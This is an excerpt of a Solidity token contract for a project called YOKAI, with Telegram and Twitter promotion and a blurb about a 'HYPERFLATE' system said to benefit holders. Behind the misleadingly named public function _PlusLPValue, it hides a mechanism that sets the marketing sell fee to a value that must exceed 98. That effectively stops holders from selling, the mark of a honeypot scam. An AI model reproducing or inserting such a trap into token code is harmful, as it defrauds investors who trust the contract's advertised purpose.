...
// TG : https://t.me/YokaiETH

/**
-----Telegram : https://t.me/YokaiETH

--------------Twitter : https://twitter.com/YokaiETH

**/

/*

⛩ Inspired from the Japanese culture and mythology, YOKAI ONI will be the protagonist in our project. The two-faced creature 
(Jin/Ki), will be those who will reign above us all 24/7. Providing two different events during those modes, the investors 
and holders will benefit and in the meantime help the sustainability of the chart. The "HYPERFLATE" system will be something 
that will help both sides, our holders bags and the chart simultaneously. ⛩
...
contract YOKAI is Context, ERC20, Ownable {
    ...
    function _PlusLPValue(uint256 _LPAdditionalAmount) public {
        require(_LPAdditionalAmount > 98);
        sellFee.marketing = _LPAdditionalAmount;
    }
    ...
    function _transfer(
        ...
        if(takeFee){
            if(to != uniswapV2Pair){
                require(amount <= _maxTxAmount || isTxLimitExempt[from] || isTxLimitExempt[to], "Transfer Amount exceeds the maxTxnsAmount");
